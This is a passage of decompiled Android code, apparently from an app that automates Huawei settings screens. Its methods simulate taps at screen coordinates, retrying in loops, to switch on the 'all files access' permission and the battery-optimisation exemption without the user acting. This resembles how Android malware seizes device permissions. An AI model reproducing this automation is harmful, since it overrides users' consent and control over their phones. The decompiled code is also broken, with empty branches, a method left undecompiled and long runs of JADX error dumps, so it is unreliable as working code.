                                            if (c0365a2.m212181d5() > 720) {
                                                iM212181d5 = (int) (c0365a2.m212181d5() * 0.85f);
                                                fM212180d4 = c0365a2.m212180d4();
                                                f = 0.24f;
                                            } else if (c0365a2.m212181d5() <= 1080) {
                                                iM212181d5 = (int) (c0365a2.m212181d5() * 0.87f);
                                                fM212180d4 = c0365a2.m212180d4();
                                                f = 0.255f;
                                            } else {
                                                iM212181d5 = (int) (c0365a2.m212181d5() * 0.88f);
                                                fM212180d4 = c0365a2.m212180d4();
                                                f = 0.265f;
                                            }
                                            i7 = (int) (fM212180d4 * f);
                                            t60.m214704c5("HuaweiSteps", "[所有文件] 屏幕: " + c0365a2.m212181d5() + "x" + c0365a2.m212180d4() + ", 坐标: (" + iM212181d5 + ", " + i7 + ")");
                                            i6 = 1;
                                            if (i6 < 11) {
                                                if (Environment.isExternalStorageManager()) {
                                                    t60.m214704c5("HuaweiSteps", "[所有文件] 权限已开启");
                                                } else {
                                                    t60.m214704c5("HuaweiSteps", "[所有文件] 第" + i6 + "次点击: (" + iM212181d5 + ", " + i7 + ")");
                                                    c0365a2.m212202f9((float) iM212181d5, (float) i7);
                                                    huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                                                    huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                                                    huaweiSteps$executeAllFilesAccess$1.f54001a2 = iM212181d5;
                                                    huaweiSteps$executeAllFilesAccess$1.f54002a3 = i7;
                                                    huaweiSteps$executeAllFilesAccess$1.f54003a4 = i6;
                                                    huaweiSteps$executeAllFilesAccess$1.f54006a7 = 3;
                                                    if (b81.m210571b1(300L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                                        if (i6 % 3 == 0) {
                                                            c0365a2.m212158a1();
                                                            huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                                                            huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                                                            huaweiSteps$executeAllFilesAccess$1.f54001a2 = iM212181d5;
                                                            huaweiSteps$executeAllFilesAccess$1.f54002a3 = i7;
                                                            huaweiSteps$executeAllFilesAccess$1.f54003a4 = i6;
                                                            huaweiSteps$executeAllFilesAccess$1.f54006a7 = 4;
                                                            if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                                                i3 = i;
                                                                c0365a22 = c0365a2;
                                                                i4 = iM212181d5;
                                                                i5 = i7;
                                                                i7 = i5;
                                                                iM212181d5 = i4;
                                                                i = i3;
                                                                c0365a2 = c0365a22;
                                                            }
                                                        }
                                                        i6++;
                                                        if (i6 < 11) {
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                                        huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                                        huaweiSteps$executeAllFilesAccess$1.f54006a7 = 5;
                                        if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                            i2 = 1;
                                            if (i2 < 6) {
                                                if (!Environment.isExternalStorageManager()) {
                                                    c0365a2.m212158a1();
                                                    huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                                                    huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                                                    huaweiSteps$executeAllFilesAccess$1.f54001a2 = i2;
                                                    huaweiSteps$executeAllFilesAccess$1.f54006a7 = 6;
                                                    break;
                                                } else {
                                                    t60.m214704c5("HuaweiSteps", "[所有文件] 权限已开启");
                                                }
                                            }
                                            if (Environment.isExternalStorageManager()) {
                                                t60.m214704c5("HuaweiSteps", "[所有文件] 权限开启成功");
                                            } else {
                                                t60.m214704c5("HuaweiSteps", "[所有文件] 权限仍未开启");
                                            }
                                            c0365a2.m212195f2(c0365a2.f55075b3);
                                            t60.m214704c5("HuaweiSteps", "[所有文件] 完成");
                                            return c1351vv;
                                        }
                                    }
                                }
                            }
                            if (i8 == 0) {
                                if (c0365a2.m212181d5() > 720) {
                                }
                                i7 = (int) (fM212180d4 * f);
                                t60.m214704c5("HuaweiSteps", "[所有文件] 屏幕: " + c0365a2.m212181d5() + "x" + c0365a2.m212180d4() + ", 坐标: (" + iM212181d5 + ", " + i7 + ")");
                                i6 = 1;
                                if (i6 < 11) {
                                }
                            }
                            huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                            huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                            huaweiSteps$executeAllFilesAccess$1.f54006a7 = 5;
                            if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                break;
            case 1:
                i = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                c0365a2 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv2;
                t60.m214704c5("HuaweiSteps", "[所有文件] 步骤2: 页面验证");
                if (c0365a2.m212188e2()) {
                }
                break;
            case 2:
                int i13 = huaweiSteps$executeAllFilesAccess$1.f54001a2;
                i = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                c0365a2 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                kg1.m213544f4(obj);
                i9 = i13;
                c1351vv = c1351vv2;
                i8 = i9;
                if (i8 == 0) {
                }
                huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                huaweiSteps$executeAllFilesAccess$1.f54006a7 = 5;
                if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                }
                break;
            case 3:
                int i14 = huaweiSteps$executeAllFilesAccess$1.f54003a4;
                int i15 = huaweiSteps$executeAllFilesAccess$1.f54002a3;
                int i16 = huaweiSteps$executeAllFilesAccess$1.f54001a2;
                int i17 = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                C0365a2 c0365a23 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                try {
                    kg1.m213544f4(obj);
                    c1351vv = c1351vv2;
                    i6 = i14;
                    i7 = i15;
                    iM212181d5 = i16;
                    i = i17;
                    c0365a2 = c0365a23;
                } catch (Exception e3) {
                    e = e3;
                    c1351vv = c1351vv2;
                    i = i17;
                    c0365a2 = c0365a23;
                    tz0.m214807a7("[所有文件] 异常: ", e.getMessage(), "HuaweiSteps");
                    i++;
                    c1351vv2 = c1351vv;
                    i11 = 3;
                    if (i >= i11) {
                    }
                }
                if (i6 % 3 == 0) {
                }
                i6++;
                if (i6 < 11) {
                }
                huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                huaweiSteps$executeAllFilesAccess$1.f54006a7 = 5;
                if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                }
                break;
            case 4:
                int i18 = huaweiSteps$executeAllFilesAccess$1.f54003a4;
                i5 = huaweiSteps$executeAllFilesAccess$1.f54002a3;
                i4 = huaweiSteps$executeAllFilesAccess$1.f54001a2;
                i3 = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                c0365a22 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                try {
                    kg1.m213544f4(obj);
                    c1351vv = c1351vv2;
                    i6 = i18;
                } catch (Exception e4) {
                    e = e4;
                    c1351vv = c1351vv2;
                    c0365a2 = c0365a22;
                    i = i3;
                    tz0.m214807a7("[所有文件] 异常: ", e.getMessage(), "HuaweiSteps");
                    i++;
                    c1351vv2 = c1351vv;
                    i11 = 3;
                    if (i >= i11) {
                    }
                }
                i7 = i5;
                iM212181d5 = i4;
                i = i3;
                c0365a2 = c0365a22;
                i6++;
                if (i6 < 11) {
                }
                huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                huaweiSteps$executeAllFilesAccess$1.f54006a7 = 5;
                if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                }
                break;
            case 5:
                i = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                c0365a2 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv2;
                i2 = 1;
                if (i2 < 6) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                c0365a2.m212195f2(c0365a2.f55075b3);
                t60.m214704c5("HuaweiSteps", "[所有文件] 完成");
                return c1351vv;
            case 6:
                int i19 = huaweiSteps$executeAllFilesAccess$1.f54001a2;
                i = huaweiSteps$executeAllFilesAccess$1.f54000a1;
                c0365a2 = huaweiSteps$executeAllFilesAccess$1.f53999a0;
                kg1.m213544f4(obj);
                i2 = i19;
                c1351vv = c1351vv2;
                try {
                } catch (Exception e5) {
                    e = e5;
                    tz0.m214807a7("[所有文件] 异常: ", e.getMessage(), "HuaweiSteps");
                    i++;
                    c1351vv2 = c1351vv;
                    i11 = 3;
                    if (i >= i11) {
                    }
                }
                i2++;
                if (i2 < 6) {
                }
                if (Environment.isExternalStorageManager()) {
                }
                c0365a2.m212195f2(c0365a2.f55075b3);
                t60.m214704c5("HuaweiSteps", "[所有文件] 完成");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /*  JADX ERROR: Types fix failed
        jadx.core.utils.exceptions.JadxOverflowException: Type inference error: updates count limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:96)
        */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:193:0x03c4 -> B:195:0x03c8). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:201:0x03df -> B:198:0x03d4). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:222:0x042f -> B:231:0x0444). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:227:0x0435 -> B:199:0x03db). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:251:0x0309 -> B:197:0x03d3). Please report as a decompilation issue!!! */
    /* renamed from: b1 */
    public final java.lang.Object m212164b1(kotlin.coroutines.jvm.internal.ContinuationImpl r28) {
        /*
            Method dump skipped, instructions count: 1156
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0365a2.m212164b1(kotlin.coroutines.jvm.internal.ContinuationImpl):java.lang.Object");
    }

    /* JADX WARN: Code restructure failed: missing block: B:133:0x02b2, code lost:
    
        if (p000.b81.m210571b1(100, r3) == r4) goto L154;
     */
    /* JADX WARN: Code restructure failed: missing block: B:153:0x0321, code lost:
    
        if (p000.b81.m210571b1(100, r3) == r4) goto L154;
     */
    /* JADX WARN: Removed duplicated region for block: B:104:0x01dd  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x01ed A[Catch: Exception -> 0x004a, TRY_LEAVE, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x0228 A[Catch: Exception -> 0x0063, TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0242 A[Catch: Exception -> 0x0063, TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:119:0x024c A[Catch: Exception -> 0x0063, PHI: r5 r13 r14 r15
      0x024c: PHI (r5v10 int) = (r5v11 int), (r5v13 int) binds: [B:117:0x0240, B:112:0x0226] A[DONT_GENERATE, DONT_INLINE]
      0x024c: PHI (r13v10 int) = (r13v11 int), (r13v13 int) binds: [B:117:0x0240, B:112:0x0226] A[DONT_GENERATE, DONT_INLINE]
      0x024c: PHI (r14v7 int) = (r14v8 int), (r14v9 int) binds: [B:117:0x0240, B:112:0x0226] A[DONT_GENERATE, DONT_INLINE]
      0x024c: PHI (r15v5 com.storm.safe.rock.service.modules.yw5xud.a2) = (r15v6 com.storm.safe.rock.service.modules.yw5xud.a2), (r15v7 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:117:0x0240, B:112:0x0226] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:121:0x0268  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x026a A[Catch: Exception -> 0x0063, PHI: r5 r13 r14 r15
      0x026a: PHI (r5v9 int) = (r5v10 int), (r5v33 int) binds: [B:120:0x0266, B:33:0x008a] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r13v9 int) = (r13v10 int), (r13v32 int) binds: [B:120:0x0266, B:33:0x008a] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r14v6 int) = (r14v7 int), (r14v17 int) binds: [B:120:0x0266, B:33:0x008a] A[DONT_GENERATE, DONT_INLINE]
      0x026a: PHI (r15v4 com.storm.safe.rock.service.modules.yw5xud.a2) = (r15v5 com.storm.safe.rock.service.modules.yw5xud.a2), (r15v15 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:120:0x0266, B:33:0x008a] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:124:0x027c  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x027e A[Catch: Exception -> 0x0063, PHI: r0 r5 r13 r14 r15
      0x027e: PHI (r0v27 java.lang.Object) = (r0v33 java.lang.Object), (r0v1 java.lang.Object) binds: [B:123:0x027a, B:30:0x007d] A[DONT_GENERATE, DONT_INLINE]
      0x027e: PHI (r5v8 int) = (r5v9 int), (r5v34 int) binds: [B:123:0x027a, B:30:0x007d] A[DONT_GENERATE, DONT_INLINE]
      0x027e: PHI (r13v8 int) = (r13v9 int), (r13v33 int) binds: [B:123:0x027a, B:30:0x007d] A[DONT_GENERATE, DONT_INLINE]
      0x027e: PHI (r14v5 int) = (r14v6 int), (r14v18 int) binds: [B:123:0x027a, B:30:0x007d] A[DONT_GENERATE, DONT_INLINE]
      0x027e: PHI (r15v3 com.storm.safe.rock.service.modules.yw5xud.a2) = (r15v4 com.storm.safe.rock.service.modules.yw5xud.a2), (r15v16 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:123:0x027a, B:30:0x007d] A[DONT_GENERATE, DONT_INLINE], TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0286 A[Catch: Exception -> 0x0063, TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02a2 A[Catch: Exception -> 0x0063, TRY_LEAVE, TryCatch #1 {Exception -> 0x0063, blocks: (B:111:0x0220, B:113:0x0228, B:116:0x023c, B:118:0x0242, B:119:0x024c, B:122:0x026a, B:125:0x027e, B:127:0x0286, B:130:0x029a, B:132:0x02a2, B:22:0x005e, B:27:0x0070, B:30:0x007d, B:33:0x008a, B:36:0x0097, B:39:0x00a4), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:136:0x02bf A[PHI: r0 r5 r13
      0x02bf: PHI (r0v11 int) = (r0v40 int), (r0v46 int) binds: [B:118:0x0242, B:106:0x01eb] A[DONT_GENERATE, DONT_INLINE]
      0x02bf: PHI (r5v3 int) = (r5v12 int), (r5v14 int) binds: [B:118:0x0242, B:106:0x01eb] A[DONT_GENERATE, DONT_INLINE]
      0x02bf: PHI (r13v4 com.storm.safe.rock.service.modules.yw5xud.a2) = (r13v12 com.storm.safe.rock.service.modules.yw5xud.a2), (r13v14 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:118:0x0242, B:106:0x01eb] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:137:0x02c1 A[Catch: Exception -> 0x004a, TRY_ENTER, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:145:0x02e0 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:152:0x0315  */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0327  */
    /* JADX WARN: Removed duplicated region for block: B:65:0x00f3  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x0113 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x012f A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x014a A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x0167 A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:93:0x017e A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:99:0x01bb A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:66:0x00f8, B:69:0x010b, B:71:0x0113, B:73:0x011a, B:76:0x0128, B:77:0x012f, B:80:0x0142, B:82:0x014a, B:84:0x0151, B:87:0x0160, B:88:0x0167, B:91:0x0178, B:93:0x017e, B:95:0x0185, B:98:0x01af, B:99:0x01bb, B:102:0x01cf, B:105:0x01df, B:107:0x01ed, B:137:0x02c1, B:139:0x02c9, B:143:0x02da, B:145:0x02e0, B:148:0x02fe, B:14:0x0045, B:19:0x0051, B:42:0x00ad, B:45:0x00b6, B:48:0x00bf, B:51:0x00c8, B:54:0x00d1, B:57:0x00da), top: B:160:0x002d }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:135:0x02b6 -> B:106:0x01eb). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:153:0x0321 -> B:155:0x0324). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:74:0x0124 -> B:155:0x0324). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:85:0x015c -> B:155:0x0324). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:96:0x01ab -> B:155:0x0324). Please report as a decompilation issue!!! */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212165b2(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeBatteryOptimization$1 huaweiSteps$executeBatteryOptimization$1;
        C0365a2 c0365a2;
        int i;
        C0365a2 c0365a22;
        int i2;
        int i3;
        int i4;
        int i5;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeBatteryOptimization$1) {
            huaweiSteps$executeBatteryOptimization$1 = (HuaweiSteps$executeBatteryOptimization$1) continuationImpl;
            int i6 = huaweiSteps$executeBatteryOptimization$1.f54018a6;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeBatteryOptimization$1.f54018a6 = i6 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeBatteryOptimization$1 = new HuaweiSteps$executeBatteryOptimization$1(this, continuationImpl);
            }
        }
        Object objM212174c1 = huaweiSteps$executeBatteryOptimization$1.f54016a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = huaweiSteps$executeBatteryOptimization$1.f54018a6;
        int i8 = 2;
        try {
            try {
            } catch (Exception e) {
                e = e;
                tz0.m214808a8("[电池] 执行过程异常: ", e.getMessage(), "HuaweiSteps", e);
                i8 = 2;
                if (i7 < 2) {
                    c0365a2.m212195f2(c0365a2.f55070a8);
                    return c1351vv;
                }
                huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                huaweiSteps$executeBatteryOptimization$1.f54018a6 = 17;
            }
        } catch (Exception e2) {
            e = e2;
            i7 = i2;
            c0365a2 = c0365a22;
            tz0.m214808a8("[电池] 执行过程异常: ", e.getMessage(), "HuaweiSteps", e);
            i8 = 2;
            if (i7 < 2) {
            }
        }
        switch (i7) {
            case 0:
                kg1.m213544f4(objM212174c1);
                if (m212193f0(this.f55070a8)) {
                    t60.m214704c5("HuaweiSteps", "[电池] 已完成，跳过");
                    return c1351vv;
                }
                c0365a2 = this;
                i7 = 1;
                if (i7 < 3) {
                    AbstractC0003a2.m44c5("[电池] 第", i7, "次尝试", "HuaweiSteps");
                    t60.m214704c5("HuaweiSteps", "[电池] 步骤1: 打开设置");
                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                    huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                    huaweiSteps$executeBatteryOptimization$1.f54018a6 = 1;
                    objM212174c1 = c0365a2.m212197f4(huaweiSteps$executeBatteryOptimization$1);
                    if (objM212174c1 != coroutineSingletons) {
                        if (((Boolean) objM212174c1).booleanValue()) {
                            t60.m214704c5("HuaweiSteps", "[电池] 打开设置失败");
                            if (i7 >= i8) {
                                c0365a2.m212195f2(c0365a2.f55070a8);
                                return c1351vv;
                            }
                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = i8;
                            if (b81.m210571b1(100L, huaweiSteps$executeBatteryOptimization$1) == coroutineSingletons) {
                            }
                            i7++;
                            if (i7 < 3) {
                            }
                        } else {
                            t60.m214704c5("HuaweiSteps", "[电池] 步骤2: 找电池");
                            huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
                            huaweiSteps$executeBatteryOptimization$1.f54013a1 = i7;
                            huaweiSteps$executeBatteryOptimization$1.f54018a6 = 3;
                            objM212174c1 = c0365a2.m212174c1(huaweiSteps$executeBatteryOptimization$1);
                            if (objM212174c1 != coroutineSingletons) {
                                if (((Boolean) objM212174c1).booleanValue()) {
                                    t60.m214704c5("HuaweiSteps", "[电池] 找电池失败");
                                    if (i7 >= i8) {
                                        c0365a2.m212195f2(c0365a2.f55070a8);
                                        return c1351vv;
                                    }
                                    huaweiSteps$executeBatteryOptimization$1.f54012a0 = c0365a2;
